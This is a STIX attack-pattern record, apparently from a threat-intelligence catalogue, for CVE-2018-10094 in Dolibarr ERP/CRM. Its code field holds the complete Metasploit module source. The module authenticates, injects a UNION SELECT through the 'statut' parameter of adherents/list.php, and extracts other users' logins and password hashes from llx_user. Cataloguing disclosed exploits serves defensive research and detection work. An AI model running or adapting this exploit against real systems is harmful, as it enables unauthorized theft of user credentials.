{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--131ae76b-800c-433a-8cbb-09c4d3794d81",
    "created": "2024-08-14T16:31:28.368408Z",
    "modified": "2024-08-14T16:31:28.368412Z",
    "name": "Dolibarr Gather Credentials via SQL Injection",
    "description": " This module enables an authenticated user to collect the usernames and encrypted passwords of other users in the Dolibarr ERP/CRM via SQL injection. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/dolibarr_creds_sqli.rb",
            "external_id": "dolibarr_creds_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10094"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Dolibarr Gather Credentials via SQL Injection',\n      'Description'    => %q{\n         This module enables an authenticated user to collect the usernames and\n         encrypted passwords of other users in the Dolibarr ERP/CRM via SQL\n         injection.\n      },\n      'Author'         => [\n                            'Issam Rabhi',  # PoC\n                            'Kevin Locati', # PoC\n                            'Shelby Pace',  # Metasploit Module\n                          ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n                            [ 'CVE', '2018-10094' ],\n                            [ 'EDB', '44805']\n                          ],\n      'DisclosureDate' => '2018-05-30'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The base path to Dolibarr', '/' ]),\n        OptString.new('USERNAME', [ true, 'The username for authenticating to Dolibarr', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'The password for authenticating to Dolibarr', 'admin' ])\n      ])\n  end\n\n  def check_availability\n    login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  normalize_uri(login_page)\n    )\n\n    return false unless res && res.body.include?('Dolibarr')\n\n    return res\n  end\n\n  def login(response)\n    return false unless response\n\n    login_uri = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')\n    cookies = response.get_cookies\n    print_status(\"Logging in...\")\n\n    login_res = send_request_cgi(\n       'method'  =>  'POST',\n       'uri'     =>  login_uri,\n       'cookie'  =>  cookies,\n       'vars_post' =>  {\n         'username'  =>  datastore['USERNAME'],\n         'password'  =>  datastore['PASSWORD'],\n         'loginfunction' =>  'loginfunction'\n       }\n     )\n\n    unless login_res && login_res.body.include?('id=\"mainmenua_members\"')\n      fail_with(Failure::NoAccess, \"Couldn't log into Dolibarr\")\n    end\n\n    print_good(\"Successfully logged into Dolibarr\")\n    return cookies\n  end\n\n  def get_info(cookies)\n    inject_uri = target_uri.path.end_with?('index.php') ? target_uri.path.gsub('index.php', '') : target_uri.path\n    inject_uri <<= \"/adherents/list.php?leftmenu=members&statut=\"\n    cmd = \"1) union select 0,1,login,pass_crypted,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from llx_user #\"\n    cmd = Rex::Text.uri_encode(cmd, 'hex-all')\n    inject_uri <<= cmd\n\n    inject_res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     => normalize_uri(inject_uri),\n      'cookie'  => cookies\n    )\n\n    unless inject_res && inject_res.body.include?('id=\"searchFormList\"')\n     fail_with(Failure::NotFound, \"Failed to access page. The user may not have permissions.\")\n    end\n\n    print_good(\"Accessed credentials\")\n    format_results(inject_res.body)\n  end\n\n  def format_results(output)\n    credentials = output.scan(/valignmiddle\">0<\\/div><\\/a><\\/td>.<td>([a-zA-Z0-9]*)<\\/td>.<td>(\\S*)<\\/td>/m)\n\n    fail_with(Failure::NotFound, \"No credentials found\") if credentials.empty?\n\n    credentials.each do |i, j|\n      print_good(\"#{j} #{i}\")\n      store_valid_credential(user: j, private: i)\n    end\n  end\n\n  def run\n    available_res = check_availability\n    fail_with(Failure::NotFound, \"Could not access the Dolibarr webpage\") unless available_res\n\n    cookies = login(available_res)\n    fail_with(Failure::NoAccess, \"Could not log in. Verify credentials\") unless cookies\n\n    get_info(cookies)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-30"
}